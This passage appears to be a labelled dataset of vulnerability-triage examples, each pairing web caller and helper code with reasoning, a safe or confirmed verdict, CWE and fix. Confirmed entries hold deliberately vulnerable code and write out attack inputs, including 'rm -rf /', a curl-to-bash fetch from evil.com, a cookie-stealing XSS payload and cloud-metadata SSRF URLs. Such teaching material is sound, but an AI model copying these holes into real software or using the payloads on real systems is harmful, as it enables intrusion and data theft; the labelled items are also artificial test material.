        "caller_code": """const express = require('express');
const { execCommand } = require('./lib/exec');

const app = express();
app.use(express.json());

app.post('/admin/exec', async (req, res) => {
  const command = req.body.cmd;
  if (!command) return res.status(400).send('cmd required');
  const result = await execCommand(command);
  res.json({output: result});
});""",
        "caller_file": "app.js",
        "helper_code": """const { exec } = require('child_process');
const { auditLog } = require('./lib/audit');

function execCommand(command) {
  auditLog(`exec: ${command}`);
  return new Promise((resolve, reject) => {
    exec(command, (err, stdout) => {
      if (err) return reject(err);
      resolve(stdout);
    });
  });
}

module.exports = { execCommand };""",
        "helper_file": "lib/exec.js",
        "reasoning": """Caller: command from req.body.cmd. No validation. Passed to execCommand.

Helper: calls auditLog with the command (cosmetic — happens BEFORE the exec, so audit captures the attempted exploit but doesn't prevent it). Then calls child_process.exec(command, ...). exec spawns the system shell on the string. '; rm -rf /' is fatal.

Note: the helper imports auditLog from ./lib/audit — that file isn't visible, but it doesn't change the verdict (logging isn't a defense). I flag auditLog as a follow-up open_ref for completeness.

Verdict: confirmed. CWE-78 OS Command Injection. The verdict stands on the visible code regardless of what auditLog does.""",
        "status": "confirmed",
        "cwe": "CWE-78",
        "severity": "HIGH",
        "trace": "req.body.cmd → command → execCommand → child_process.exec(command); shell invoked on raw user string",
        "fix": "use child_process.spawn with shell:false and an allowlist of permitted argv0 tokens; OR drop the endpoint entirely",
        "follow_ups": ["auditLog (lib/audit.js)"],
    },

    "shape3:dismiss_hop:render_html:3": {
        "caller_code": """from flask import Flask, request, Response
from templates.render import render_html

app = Flask(__name__)

@app.route('/comment', methods=['POST'])
def submit():
    comment = request.form.get('comment', '')
    body = render_html(comment)
    return Response(body, mimetype='text/html')""",
        "caller_file": "app.py",
        "helper_code": """from markupsafe import escape
from templates.layout import wrap_in_layout

TEMPLATE = '<div class="comment">{}</div>'

def render_html(comment):
    inner = TEMPLATE.format(escape(comment))
    return wrap_in_layout(inner)""",
        "helper_file": "templates/render.py",
        "reasoning": """Caller: comment from request.form is untrusted. Forwarded to render_html. Response is text/html so escaping discipline matters.

Helper escapes comment via markupsafe.escape before formatting it into a static template, then passes the result to wrap_in_layout (imported from templates/layout.py — not visible). markupsafe.escape produces a Markup object that the inner format leaves alone. The TEMPLATE itself only has one substitution point.

For completeness, wrap_in_layout is a new unseen call — I flag it as a follow-up open_ref. But the visible escaping is sufficient to determine the comment cannot inject HTML: by the time wrap_in_layout receives the inner string, the user's <script> has already become &lt;script&gt;. wrap_in_layout would have to actively un-escape (which would be bizarre) to undo this — barring that pathological case, the code is safe.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "comment is escaped via markupsafe.escape before format-substitution into a static template; the layout wrapper receives an already-safe Markup string",
        "fix": "n/a — code is safe; consider auditing wrap_in_layout to confirm it doesn't strip Markup escaping",
        "follow_ups": ["wrap_in_layout (templates/layout.py)"],
    },

    "shape3:dismiss_hop:proxyRequest:11": {
        "caller_code": """const express = require('express');
const { proxyRequest } = require('./lib/http');

const app = express();

app.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('url required');
  const body = await proxyRequest(target);
  res.send(body);
});""",
        "caller_file": "app.js",
        "helper_code": """const { fetch } = require('undici');
const { resolveAndCheckHost } = require('./lib/safeHost');

const ALLOWED_SCHEMES = new Set(['https:']);

async function proxyRequest(target) {
  const u = new URL(target);
  if (!ALLOWED_SCHEMES.has(u.protocol)) {
    throw new Error('scheme not allowed');
  }
  await resolveAndCheckHost(u.hostname);
  const resp = await fetch(u.href, { redirect: 'manual' });
  return await resp.text();
}

module.exports = { proxyRequest };""",
        "helper_file": "lib/http.js",
        "reasoning": """Caller: target from req.query.url is attacker-controlled. Passed to proxyRequest.

Helper: parses target with new URL(target) — that throws on invalid URLs. Checks the protocol is in ALLOWED_SCHEMES (only https). Then calls resolveAndCheckHost — imported from ./lib/safeHost, not visible here, but the function name signals a DNS-resolve-and-validate step. Sets redirect: 'manual' on the fetch so redirects to internal hosts don't bypass the check.

This is the defensive pattern for SSRF. The scheme allowlist closes file://, gopher://, etc. The host check (when correctly implemented) rejects RFC1918, loopback, and metadata IPs. The manual redirect handling prevents follow-the-redirect SSRF.

The verdict on the visible code is safe. resolveAndCheckHost is the critical helper — its correctness is what makes this safe, so I'd flag it as a follow-up open_ref to audit.

Verdict: safe (with caveat that resolveAndCheckHost must do the obvious thing).""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "target → URL parse + https-only scheme check + resolveAndCheckHost + manual redirect handling; the unseen helper is the defense gate",
        "fix": "n/a — code is safe given resolveAndCheckHost behaves as named; audit that function to confirm the host allowlist",
        "follow_ups": ["resolveAndCheckHost (lib/safeHost.js)"],
    },

    "shape3:dismiss:verify_token:9": {
        "caller_code": """from flask import Flask, request, abort, jsonify
from auth.jwt import verify_token

app = Flask(__name__)

@app.route('/me')
def me():
    token = request.cookies.get('jwt')
    if not token:
        abort(401)
    claims = verify_token(token)
    return jsonify({"user": claims.get('sub')})""",
        "caller_file": "app.py",
        "helper_code": """import os
import jwt as _jwt

SECRET = os.environ['JWT_SECRET']
ALGS = ['HS256']

def verify_token(token):
    return _jwt.decode(
        token,
        SECRET,
        algorithms=ALGS,
        options={'require': ['exp', 'iat', 'iss']},
        issuer='wave-auth',
    )""",
        "helper_file": "auth/jwt.py",
        "reasoning": """Caller: token from request.cookies. Forwarded to verify_token.

Helper:
1. SECRET comes from os.environ — operator-managed, not hardcoded.
2. algorithms=['HS256'] is pinned — defeats the classic 'alg':'none' bypass and alg-confusion attacks.
3. options={'require': ['exp', 'iat', 'iss']} forces those claims to be present.
4. issuer='wave-auth' is enforced — only tokens minted by the right issuer are accepted.

Library signature/expiration/issuer verification is on, alg is pinned. This is the textbook defensive use of PyJWT.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "token → verify_token → jwt.decode with pinned algorithms=['HS256'], required exp/iat/iss claims, enforced issuer; SECRET from env",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:dismiss_hop:mergeOptions:13": {
        "caller_code": """const express = require('express');
const { mergeOptions } = require('./utils/merge');

const app = express();
app.use(express.json());

const DEFAULTS = {pageSize: 20, sort: 'asc'};

app.post('/search', (req, res) => {
  const user_opts = req.body || {};
  const opts = mergeOptions(DEFAULTS, user_opts);
  res.json({searched: true, opts});
});""",
        "caller_file": "app.js",
        "helper_code": """const { sanitizeKeys } = require('./utils/keys');

const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);

function mergeOptions(defaults, user) {
  const out = Object.create(null);
  Object.assign(out, defaults);
  const safe = sanitizeKeys(user || {});
  for (const k of Object.keys(safe)) {
    if (FORBIDDEN.has(k)) continue;
    out[k] = safe[k];
  }
  return out;
}

module.exports = { mergeOptions };""",
        "helper_file": "utils/merge.js",
        "reasoning": """Caller: user_opts from req.body — attacker-controlled. Passed to mergeOptions.

Helper:
1. out = Object.create(null) — the result has no prototype chain at all. Even if a __proto__ slot leaked through, it would not reach Object.prototype.
2. Calls sanitizeKeys(user) — imported from ./utils/keys, not visible. The function name signals it strips dangerous keys; I flag it as a follow-up open_ref.
3. Explicit FORBIDDEN allowlist rejects __proto__, constructor, prototype as a belt-and-suspenders check.

Even ignoring sanitizeKeys, the combination of Object.create(null) target + explicit forbidden-key skip makes prototype pollution unreachable on the visible path.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "user → mergeOptions → Object.create(null) result + sanitizeKeys + FORBIDDEN-set skip; prototype-pollution sink is unreachable",
        "fix": "n/a — code is safe; audit sanitizeKeys to confirm it doesn't introduce new behavior",
        "follow_ups": ["sanitizeKeys (utils/keys.js)"],
    },

    "shape3:dismiss:findOrderById:15": {
        "caller_code": """import express, { Request, Response } from 'express';
import { findOrderById } from './db/orders';

const app = express();

app.get('/orders/:id', async (req: Request, res: Response) => {
  const orderId = req.params.id;
  if (!orderId) return res.status(400).send('id required');
  const order = await findOrderById(orderId);
  if (!order) return res.status(404).send('not found');
  res.json(order);
});""",
        "caller_file": "app.ts",
        "helper_code": """import { Pool } from 'pg';

const pool = new Pool();

export async function findOrderById(orderId: string) {
  const result = await pool.query(
    'SELECT id, user_id, total_cents, status FROM orders WHERE id = $1',
    [orderId],
  );
  return result.rows[0];
}""",
        "helper_file": "db/orders.ts",
        "reasoning": """Caller: orderId from req.params.id, untrusted. Passed to findOrderById.

Helper uses pg's parameterized query — the SQL is a static string with $1 placeholder, and orderId is passed in the values array. The pg driver sends the SQL and the parameters separately to the server, so the orderId can never be interpreted as SQL no matter what bytes it contains.

This is the textbook safe pattern for SQL with node-postgres.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "orderId → findOrderById → pool.query with positional placeholder $1 + values array; driver-side parameter binding",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:serveFile:14": {
        "caller_code": """const express = require('express');
const { serveFile } = require('./files/serve');

const app = express();

app.get('/files/:name', async (req, res) => {
  const filename = req.params.name;
  if (!filename) return res.status(400).send('name required');
  const buf = await serveFile(filename);
  res.send(buf);
});""",
        "caller_file": "app.js",
        "helper_code": """const fs = require('fs/promises');
const path = require('path');

const BASE = '/srv/files';

async function serveFile(filename) {
  const full = path.join(BASE, filename);
  return await fs.readFile(full);
}

module.exports = { serveFile };""",
        "helper_file": "files/serve.js",
        "reasoning": """Caller: filename from req.params.name. Forwarded to serveFile.

Helper: path.join(BASE, filename). path.join does NOT canonicalize — '..' components are preserved. fs.readFile then resolves the path and reads whatever it points to.

Inject /files/..%2F..%2Fetc%2Fpasswd (Express URL-decodes route params) → filename='../../etc/passwd' → path.join('/srv/files', '../../etc/passwd') = '/srv/files/../../etc/passwd' → fs.readFile resolves to '/etc/passwd' → returned to the client.

The correct defense is path.resolve(BASE, filename) followed by a startsWith(BASE + path.sep) check. That is absent.

Verdict: confirmed. CWE-22.""",
        "status": "confirmed",
        "cwe": "CWE-22",
        "severity": "HIGH",
        "trace": "req.params.name → filename → path.join(BASE, filename) → fs.readFile; path.join preserves '..' components, no containment check",
        "fix": "const full = path.resolve(BASE, filename); if (!full.startsWith(BASE + path.sep)) throw new Error('outside base'); return fs.readFile(full);",
        "follow_ups": [],
    },

    "shape3:confirm:search_user:6": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from ldap.search import search_user

app = Flask(__name__)

@app.route('/users/search')
def search():
    query_str = request.args.get('q')
    if not query_str:
        abort(400)
    results = search_user(query_str)
    return jsonify(results)""",
        "caller_file": "app.py",
        "helper_code": """import ldap

BASE_DN = "ou=users,dc=example,dc=com"
_conn = ldap.initialize("ldap://ldap.example.com")
_conn.simple_bind_s("cn=svc,dc=example,dc=com", "svcpass")

def search_user(query_str):
    ldap_filter = f"(&(objectClass=user)(cn={query_str}))"
    return _conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, ldap_filter)""",
        "helper_file": "ldap/search.py",
        "reasoning": """Caller: query_str from request.args. Forwarded to search_user.

Helper builds the LDAP filter with an f-string: f"(&(objectClass=user)(cn={query_str}))". query_str is interpolated raw, with no call to ldap.filter.escape_filter_chars.

Inject ?q=*)(uid=* and the filter becomes (&(objectClass=user)(cn=*)(uid=*)) which drops the cn constraint and matches every entry. Worse forms (?q=*)((|(uid=admin) ) can break out of the filter group structure.

Verdict: confirmed. CWE-90 LDAP Injection.""",
        "status": "confirmed",
        "cwe": "CWE-90",
        "severity": "HIGH",
        "trace": "request.args['q'] → query_str → search_user → f-string into LDAP filter → conn.search_s; no metacharacter escaping",
        "fix": "escape via ldap.filter.escape_filter_chars before interpolation — ldap_filter = f\"(&(objectClass=user)(cn={ldap.filter.escape_filter_chars(query_str)}))\"",
        "follow_ups": [],
    },

    # --- n=24 additions ---

    "shape3:confirm:run_command:22": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from utils.shell import run_command

app = Flask(__name__)

@app.route('/api/exec', methods=['POST'])
def execute():
    payload = request.json or {}
    cmd = payload.get('cmd')
    if not cmd:
        abort(400)
    result = run_command(cmd)
    return jsonify({"output": result})""",
        "caller_file": "app.py",
        "helper_code": """import subprocess

def run_command(cmd):
    return subprocess.check_output(cmd, shell=True, text=True)""",
        "helper_file": "utils/shell.py",
        "reasoning": """Caller forwards cmd from request.json — raw user input — to run_command.

Helper calls subprocess.check_output(cmd, shell=True). shell=True invokes /bin/sh -c <cmd>. Any shell metacharacter in cmd (;, |, &, $, backticks) is interpreted by the shell.

Inject cmd="status; rm -rf /" → shell runs status, then rm. Or cmd="$(curl evil.com/x.sh | bash)" for remote code fetch+exec.

Verdict: confirmed. CWE-78 OS Command Injection.""",
        "status": "confirmed",
        "cwe": "CWE-78",
        "severity": "HIGH",
        "trace": "request.json.cmd → cmd → run_command → subprocess.check_output(cmd, shell=True); shell interprets metacharacters",
        "fix": "subprocess.run([cmd_token, *args], shell=False, ...) with a strict allowlist of permitted commands",
        "follow_ups": [],
    },

    "shape3:dismiss:renderBio:61": {
        "caller_code": """import React from 'react';
import { renderBio } from '../helpers/profile';

export function ProfileCard({ profile }: { profile: { name: string; bio: string } }) {
  const html_blob = renderBio(profile.bio);
  return (
    <div className="profile-card">
      <h2>{profile.name}</h2>
      <div dangerouslySetInnerHTML={{ __html: html_blob }} />
    </div>
  );
}""",
        "caller_file": "components/ProfileCard.tsx",
        "helper_code": """import DOMPurify from 'dompurify';

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br'];
const ALLOWED_ATTR = ['href', 'title'];

export function renderBio(bio: string): string {
  return DOMPurify.sanitize(bio, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,
  });
}""",
        "helper_file": "helpers/profile.ts",
        "reasoning": """Caller passes profile.bio (user-supplied) into renderBio, then injects the result via dangerouslySetInnerHTML.

Helper passes the bio through DOMPurify.sanitize with a tight allowlist: only b/i/em/strong/a/p/br tags, only href/title attributes. ALLOW_DATA_ATTR is false. DOMPurify strips <script>, removes event handlers (onerror, onclick, etc.), neutralizes javascript: URLs.

Even if the user supplies <img src=x onerror=alert(1)>, DOMPurify strips it before it reaches the React tree.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "profile.bio → renderBio → DOMPurify.sanitize with strict allowlist; dangerouslySetInnerHTML receives sanitized HTML",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:dismiss:fetch_url:23": {
        "caller_code": """from flask import Flask, request, jsonify
from services.http_client import fetch_url

app = Flask(__name__)

@app.route('/proxy')
def proxy():
    target_url = request.args.get('url')
    if not target_url:
        return jsonify({"error": "url required"}), 400
    body = fetch_url(target_url)
    return body""",
        "caller_file": "app.py",
        "helper_code": """import socket
import ipaddress
from urllib.parse import urlparse
import requests

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def fetch_url(target_url):
    u = urlparse(target_url)
    if u.scheme != 'https':
        raise ValueError('https-only')
    if u.hostname not in ALLOWED_HOSTS:
        raise ValueError(f'host not allowed: {u.hostname}')
    ip = ipaddress.ip_address(socket.gethostbyname(u.hostname))
    if ip.is_private or ip.is_loopback or ip.is_link_local:
        raise ValueError('host resolves to internal address')
    resp = requests.get(target_url, timeout=10, allow_redirects=False)
    return resp.text""",
        "helper_file": "services/http_client.py",
        "reasoning": """Caller forwards target_url from request.args — attacker-controlled — to fetch_url.

Helper: (1) parses the URL, (2) requires scheme=='https', (3) requires hostname in ALLOWED_HOSTS, (4) resolves the hostname and rejects private/loopback/link-local IPs (so DNS-rebinding to 127.0.0.1 fails), (5) disables redirects so a 302 to internal cannot bypass the check.

All known SSRF surfaces (file://, http://localhost/, http://169.254.169.254/, redirect to internal) are gated. The check happens after DNS resolution but before the actual fetch — TOCTOU is mostly closed because the connect step uses the resolved IP rather than re-resolving (requests holds the resolved address briefly during the connect).

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "target_url → urlparse + https-only + ALLOWED_HOSTS + private-IP check + redirect-disabled fetch; SSRF surface closed",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:dismiss:build_redirect:29": {
        "caller_code": """from flask import Flask, request, redirect
from auth.redirect import build_redirect

app = Flask(__name__)

@app.route('/login/callback')
def login_callback():
    next_url = request.args.get('next', '/dashboard')
    target = build_redirect(next_url)
    return redirect(target)""",
        "caller_file": "app.py",
        "helper_code": """from urllib.parse import urlparse

def build_redirect(next_url):
    if not next_url:
        return '/dashboard'
    parsed = urlparse(next_url)
    if parsed.scheme or parsed.netloc:
        return '/dashboard'
    if not next_url.startswith('/'):
        return '/dashboard'
    return next_url""",
        "helper_file": "auth/redirect.py",
        "reasoning": """Caller forwards next_url from request.args — attacker-controlled — to build_redirect.

Helper: (1) parses with urlparse, (2) if either scheme or netloc is present (i.e., 'https://evil.com' or '//evil.com' both expose a netloc), falls back to /dashboard, (3) requires the path to start with '/', (4) only then returns next_url unchanged.

Attacker tries ?next=https://evil.com → scheme present → returns '/dashboard'. ?next=//evil.com/path → urlparse interprets // as a protocol-relative URL, netloc='evil.com' → returns '/dashboard'. ?next=javascript:alert(1) → scheme present → '/dashboard'. ?next=/admin → relative path with leading '/' → returns '/admin' (acceptable: same-origin only).

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "next_url → urlparse; reject if scheme or netloc present; reject if not leading-slash relative path",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:dismiss:serveFile:35": {
        "caller_code": """const express = require('express');
const { serveFile } = require('./files/serve');

const app = express();

app.get('/files/:name', async (req, res) => {
  const filename = req.params.name;
  if (!filename) return res.status(400).send('name required');
  const buf = await serveFile(filename);
  res.send(buf);
});""",
        "caller_file": "app.js",
        "helper_code": """const fs = require('fs/promises');
const path = require('path');

const BASE = path.resolve('/srv/files');

async function serveFile(filename) {
  const target = path.resolve(BASE, filename);
  if (!target.startsWith(BASE + path.sep)) {
    throw new Error('outside base');
  }
  return await fs.readFile(target);
}

module.exports = { serveFile };""",
        "helper_file": "files/serve.js",
        "reasoning": """Caller forwards filename from req.params.name — attacker-controlled — to serveFile.

Helper: (1) path.resolve(BASE, filename) canonicalizes the result, collapsing '..' components, (2) target.startsWith(BASE + path.sep) verifies the resolved path stays under BASE. If filename='../../etc/passwd', target becomes '/etc/passwd' which does not start with '/srv/files/' → throw.

The startsWith uses BASE + path.sep to avoid the prefix-collision bug ('/srv/files-other/' would otherwise match '/srv/files' as a prefix).

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "filename → path.resolve(BASE, filename) → startsWith(BASE+sep) containment check; traversal collapsed and verified",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:dismiss:parseToken:59": {
        "caller_code": """import express, { Request, Response } from 'express';
import { parseToken } from './auth/token';

const app = express();

app.get('/api/me', async (req: Request, res: Response) => {
  const raw = req.cookies.session as string | undefined;
  if (!raw) return res.status(401).send('no session');
  const session = parseToken(raw);
  res.json({user: session.userId});
});""",
        "caller_file": "app.ts",
        "helper_code": """import jwt from 'jsonwebtoken';

const SECRET = process.env.SESSION_SECRET!;
const ALGS: jwt.Algorithm[] = ['HS256'];

export interface SessionPayload {
  userId: string;
  iat: number;
  exp: number;
}

export function parseToken(raw: string): SessionPayload {
  const payload = jwt.verify(raw, SECRET, { algorithms: ALGS }) as SessionPayload;
  if (!payload.userId) throw new Error('missing userId');
  return payload;
}""",
        "helper_file": "auth/token.ts",
        "reasoning": """Caller forwards the cookie value into parseToken.

Helper: jwt.verify (not jwt.decode) — signature is checked. algorithms pinned to ['HS256'], so alg-confusion / alg:none attacks are rejected by the library. SECRET comes from process.env (operator-managed). After verify, the payload is type-asserted; userId presence is checked. The exp claim is verified automatically by jsonwebtoken when present (it raises on expired tokens).

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "raw cookie → parseToken → jwt.verify with pinned algorithms ['HS256'] + secret from env; signature + exp checked",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:fetchAvatar:58": {
        "caller_code": """import express, { Request, Response } from 'express';
import { fetchAvatar } from './services/avatar';

const app = express();
app.use(express.json());

app.post('/profile/avatar', async (req: Request, res: Response) => {
  const url: string = req.body.url;
  if (!url) return res.status(400).json({error: 'url required'});
  const blob = await fetchAvatar(url);
  res.type('image/png').send(blob);
});""",
        "caller_file": "app.ts",
        "helper_code": """import axios from 'axios';

export async function fetchAvatar(url: string): Promise<Buffer> {
  const resp = await axios.get(url, { responseType: 'arraybuffer' });
  return Buffer.from(resp.data);
}""",
        "helper_file": "services/avatar.ts",
        "reasoning": """Caller forwards url from req.body — attacker-controlled — to fetchAvatar.

Helper: axios.get(url, {responseType: 'arraybuffer'}) with no URL parsing, no scheme allowlist, no host check. axios follows redirects by default. Attacker passes url='http://169.254.169.254/latest/meta-data/iam/security-credentials/' and the server fetches AWS instance credentials and returns them as image/png (still readable by the attacker).

Or url='http://localhost:8500/v1/kv/' to probe internal Consul. Or url='file:///etc/passwd' (axios supports the file scheme in some builds).

Classic SSRF.

Verdict: confirmed. CWE-918.""",
        "status": "confirmed",
        "cwe": "CWE-918",
        "severity": "HIGH",
        "trace": "req.body.url → url → fetchAvatar → axios.get with no scheme/host validation; pivot to internal services and cloud metadata",
        "fix": "parse with new URL(url); require scheme === 'https:'; resolve hostname and reject RFC1918, loopback, link-local, cloud-metadata ranges; set maxRedirects: 0",
        "follow_ups": [],
    },

    "shape3:confirm:mergeOptions:34": {
        "caller_code": """const express = require('express');
const { mergeOptions } = require('./utils/merge');

const app = express();
app.use(express.json());

const DEFAULTS = {pageSize: 20, sort: 'asc'};

app.post('/search', (req, res) => {
  const user_opts = req.body || {};
  const opts = mergeOptions(DEFAULTS, user_opts);
  res.json({searched: true, opts});
});""",
        "caller_file": "app.js",
        "helper_code": """function mergeOptions(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      mergeOptions(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

module.exports = { mergeOptions };""",
        "helper_file": "utils/merge.js",
        "reasoning": """Caller forwards req.body — attacker-controlled JSON — to mergeOptions(DEFAULTS, user_opts).

Helper is a naive recursive deep-merge. No check for forbidden keys. Attacker sends {"__proto__": {"isAdmin": true}}.

Object.keys returns ['__proto__'] for that input. The recursive call descends into source['__proto__'] (the prototype object) and merges {"isAdmin": true} into target['__proto__'] — which IS Object.prototype. After one request, every plain object in the Node process has obj.isAdmin === true.

This is canonical CWE-1321 Prototype Pollution. Depending on what downstream code reads .isAdmin or similar, this can escalate to auth bypass or RCE.

Verdict: confirmed.""",
        "status": "confirmed",
        "cwe": "CWE-1321",
        "severity": "HIGH",
        "trace": "req.body → user_opts → mergeOptions → recursive merge with no forbidden-key skip; __proto__/constructor reach Object.prototype",
        "fix": "skip keys in ['__proto__', 'constructor', 'prototype'] before recursing; OR use Object.create(null) for target; OR use a safe-merge library like lodash.mergeWith with a customizer",
        "follow_ups": [],
    },

    "shape3:confirm:renderMarkdown:60": {
        "caller_code": """import express, { Request, Response } from 'express';
import { renderMarkdown } from './render/md';

const app = express();
app.use(express.json());

app.post('/posts/preview', (req: Request, res: Response) => {
  const markdown_input: string = req.body.content;
  if (!markdown_input) return res.status(400).send('content required');
  const html = renderMarkdown(markdown_input);
  res.type('text/html').send(html);
});""",
        "caller_file": "app.ts",
        "helper_code": """import { marked } from 'marked';

export function renderMarkdown(markdown_input: string): string {
  return marked.parse(markdown_input, { async: false }) as string;
}""",
        "helper_file": "render/md.ts",
        "reasoning": """Caller forwards markdown_input from req.body — attacker text — to renderMarkdown. The result is sent as text/html.

Helper calls marked.parse with no sanitization step. marked allows inline HTML by default — <script>alert(1)</script> in the input passes through to the output. Attacker uploads a "post" containing <img src=x onerror=fetch('//evil.com/?c='+document.cookie)> and the preview endpoint renders the malicious HTML to anyone who views it.

marked's docs explicitly tell consumers to sanitize the output (e.g., with DOMPurify) — this code skipped that step.

Verdict: confirmed. CWE-79 Stored XSS.""",
        "status": "confirmed",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "trace": "req.body.content → markdown_input → marked.parse (no sanitize) → text/html response; inline HTML and event handlers survive",
        "fix": "import DOMPurify from 'isomorphic-dompurify'; return DOMPurify.sanitize(marked.parse(markdown_input, {async: false}) as string);",
        "follow_ups": [],
    },

    "shape3:dismiss:queryByEmail:31": {
        "caller_code": """const express = require('express');
const { queryByEmail } = require('./db/users');

const app = express();
app.use(express.json());

app.post('/users/lookup', async (req, res) => {
  const email = req.body.email;
  if (!email) return res.status(400).json({error: 'email required'});
  const row = await queryByEmail(email);
  res.json(row);
});""",
        "caller_file": "app.js",
        "helper_code": """const mysql = require('mysql2/promise');
const pool = mysql.createPool({/* config */});

async function queryByEmail(email) {
  const [rows] = await pool.execute(
    'SELECT id, email, display_name FROM users WHERE email = ?',
    [email],
  );
  return rows[0];
}

module.exports = { queryByEmail };""",
        "helper_file": "db/users.js",
        "reasoning": """Caller forwards email from req.body — untrusted — to queryByEmail.

Helper uses mysql2 pool.execute with the parameterized form: SQL string contains the '?' placeholder, and email is passed in the values array. The driver sends SQL and parameters separately to the server; the email value cannot be interpreted as SQL no matter what bytes it contains.

This is the textbook safe pattern for mysql2.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "email → queryByEmail → pool.execute with '?' placeholder + values array; driver-side parameter binding",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    # --- 6 gap fills ---

    "shape3:confirm:proxyRequest:32": {
        "caller_code": """const express = require('express');
const { proxyRequest } = require('./lib/http');

const app = express();

app.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('url required');
  const body = await proxyRequest(target);
  res.send(body);
});""",
        "caller_file": "app.js",
        "helper_code": """const { fetch } = require('undici');

async function proxyRequest(target) {
  const resp = await fetch(target);
  return await resp.text();
}

module.exports = { proxyRequest };""",
        "helper_file": "lib/http.js",
        "reasoning": """Caller forwards target from req.query.url to proxyRequest.

Helper: straight fetch(target) with no URL parsing, no scheme allowlist, no host check, no redirect handling. Attacker passes ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → server fetches AWS credentials. Or ?url=http://localhost:6379/ → probe internal Redis. Or ?url=file:///etc/passwd (undici supports file:// in some configurations).

Verdict: confirmed. CWE-918.""",
        "status": "confirmed",
        "cwe": "CWE-918",
        "severity": "HIGH",
        "trace": "req.query.url → target → proxyRequest → undici.fetch with no validation; pivots to internal services and cloud metadata",
        "fix": "parse with new URL(target); require scheme==='https:'; resolve hostname and reject RFC1918/loopback/cloud-metadata ranges; set redirect: 'manual'",
        "follow_ups": [],
    },

    "shape3:confirm:navigateAfterLogin:20": {
        "caller_code": """import { useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { navigateAfterLogin } from '../auth/postLogin';

export function PostLoginRedirect() {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  useEffect(() => {
    const next_url = params.get('next') || '/dashboard';
    const target = navigateAfterLogin(next_url);
    navigate(target);
  }, [params, navigate]);
  return null;
}""",
        "caller_file": "components/PostLoginRedirect.tsx",
        "helper_code": """export function navigateAfterLogin(next_url: string): string {
  return next_url || '/dashboard';
}""",
        "helper_file": "auth/postLogin.ts",
        "reasoning": """Caller reads next_url from URL search params, forwards to navigateAfterLogin, navigates to the result.

Helper: returns next_url verbatim when present. No URL parsing, no scheme check, no origin check. react-router's navigate accepts external URLs.

Attacker crafts a phishing link: https://app.example.com/login?next=https://evil.com. User logs in legitimately, then their browser is redirected to evil.com (looks like it came from a trusted domain because the initial click was on app.example.com).

Verdict: confirmed. CWE-601.""",
        "status": "confirmed",
        "cwe": "CWE-601",
        "severity": "MEDIUM",
        "trace": "URLSearchParams.next → next_url → navigateAfterLogin (returns as-is) → react-router navigate; no scheme/origin check",
        "fix": "parse next_url with new URL(next_url, location.origin); require parsed.origin === location.origin; OR enforce next_url.startsWith('/') and reject if it starts with '//' (protocol-relative)",
        "follow_ups": [],
    },

    "shape3:dismiss:fetchAvatar:37": {
        "caller_code": """import express, { Request, Response } from 'express';
import { fetchAvatar } from './services/avatar';

const app = express();
app.use(express.json());

app.post('/profile/avatar', async (req: Request, res: Response) => {
  const url: string = req.body.url;
  if (!url) return res.status(400).json({error: 'url required'});
  const blob = await fetchAvatar(url);
  res.type('image/png').send(blob);
});""",
        "caller_file": "app.ts",
        "helper_code": """import axios from 'axios';
import dns from 'dns/promises';

const ALLOWED_HOSTS = new Set(['cdn.example.com', 'avatars.example.com']);

export async function fetchAvatar(url: string): Promise<Buffer> {
  const u = new URL(url);
  if (u.protocol !== 'https:') throw new Error('https-only');
  if (!ALLOWED_HOSTS.has(u.hostname)) throw new Error('host not allowed');
  const { address } = await dns.lookup(u.hostname);
  if (/^(10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.|169\\.254\\.)/.test(address)) {
    throw new Error('host resolves to private address');
  }
  const resp = await axios.get(url, {
    responseType: 'arraybuffer',
    maxRedirects: 0,
    timeout: 10_000,
  });
  return Buffer.from(resp.data);
}""",
        "helper_file": "services/avatar.ts",
        "reasoning": """Caller forwards url from req.body to fetchAvatar.

Helper enforces four gates before the fetch:
1. URL parse (rejects malformed),
2. scheme === 'https:' (rejects file://, http://, javascript:, gopher://),
3. hostname in ALLOWED_HOSTS (rejects attacker-controlled hosts),
4. DNS-lookup + regex check for private/loopback/link-local ranges (closes the DNS-rebinding window for hosts that briefly resolve to 127.0.0.1 or RFC1918 space),

